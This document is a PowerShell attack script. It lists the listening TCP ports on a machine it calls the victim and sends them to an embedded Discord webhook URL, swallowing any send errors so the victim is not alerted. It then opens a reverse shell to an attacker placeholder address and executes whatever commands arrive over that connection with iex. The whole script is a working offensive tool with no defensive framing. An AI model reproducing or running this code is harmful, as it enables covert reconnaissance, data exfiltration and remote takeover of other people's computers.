# Function to send data to a webhook
function Send-Webhook {
    param(
        [string]$webhookUrl,
        [string]$message
    )

    try {
        $payload = @{
            "content" = $message
        }
        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body ($payload | ConvertTo-Json)
    }
    catch {
        # In case of error, silently fail without notifying victim
    }
}

# Step 1: Run netstat to get open ports
$openPorts = ""
$netstatOutput = netstat -a -n -p tcp

# Parse the netstat output to get listening ports
foreach ($line in $netstatOutput) {
    if ($line -match "LISTENING") {
        $fields = $line.Split(" ", [System.StringSplitOptions]::RemoveEmptyEntries)
        $openPorts += "Port $($fields[1].Split(":")[1]) is open.`n"
    }
}

if ($openPorts) {
    # Send the open ports info to a webhook
    $webhookUrl = "https://discord.com/api/webhooks/1340370491252277370/RJHBCN8FCGZLo7FN-1Wwr5UPSx3vzJaQG0Eb8hKYF5TJEVmJG-aSoKM1CQzKGjD9B63-"
    Send-Webhook -webhookUrl $webhookUrl -message "Victim's open ports: `n$openPorts"
} else {
    Send-Webhook -webhookUrl $webhookUrl -message "No open ports found on the victim machine."
}

# Step 2: Start Reverse Shell (after sending port info)
$client = New-Object System.Net.Sockets.TCPClient('YOUR_ATTACKER_IP', YOUR_ATTACKER_PORT);
$stream = $client.GetStream();
[byte[]]$buffer = 0..255 | ForEach-Object {0};

while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = (New-Object Text.UTF8Encoding).GetString($buffer, 0, $i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush();
};

$client.Close();
